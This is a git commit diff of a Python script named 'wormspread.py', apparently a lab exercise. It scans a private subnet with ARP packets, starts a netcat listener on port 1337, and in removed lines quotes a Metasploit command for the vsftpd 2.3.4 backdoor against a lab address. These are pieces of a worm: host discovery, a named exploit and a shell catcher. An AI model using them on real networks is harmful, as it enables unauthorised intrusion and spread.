9144465ae85b06d5ae1140069c0dfc73bf66844a
Greg Randall <77461008+gregorymrandall@users.noreply.github.com>
2021-07-03 15:15:28 -0400

    Update wormspread.py

--- wormspread.py
+++ wormspread.py
@@ -1,50 +1,37 @@
 #!/usr/bin/env python3
 
 import sys
+import subprocess
 
 from scapy.all import ARP, Ether, srp
 
-target_ip = "192.168.56.111/24"
+def worm_spread():
 
-# create ARP packet
-arp = ARP(pdst=target_ip)
+    target_ip = "192.168.56.111/24"
 
-# create the Ether broadcast packet
-ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    # create ARP packet
+    arp = ARP(pdst=target_ip)
 
-# stack them
-packet = ether/arp
-result = srp(packet, timeout=3, verbose=0)[0]
+    # create the Ether broadcast packet
+    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
 
-# a list of clients, to be filled in the upcoming loop
-clients = []
+    # stack them
+    packet = ether/arp
+    result = srp(packet, timeout=3, verbose=0)[0]
 
-for sent, received in result:
-    # for each response, append ip and mac address to `clients` list
-    clients.append({'ip': received.psrc, 'mac': received.hwsrc})
+    # a list of clients, to be filled in the upcoming loop
+    clients = []
 
-# print clients
-print("Available devices in the network:")
-print("IP" + " "*18+"MAC")
-
-for client in clients:
-    print("{:16}    {}".format(client['ip'], client['mac']))
-
-<<<<<<< HEAD:wormspread.py
-for client in clients:
-    target = client['ip']
-=======
-
-#define function to launch msfconsole
-
-#In os.system
-
-#msfconsole -q -x " use exploit/unix/ftp/vsftpd_234_backdoor; set rhost 192.168.56.111; run
+    for sent, received in result:
+    # for each response, append ip 
+        clients.append(received.psrc)
+    return clients
+print(worm_spread())
 
 
+def nc_listener():
+    nc_setup=subprocess.run(["nc", "-lp", "1337"])
+    return nc_setup
+print(nc_listener())
 
 
-
-
-    		
->>>>>>> 4e2f4293411c825532d5c348237449bac7762093:spreading
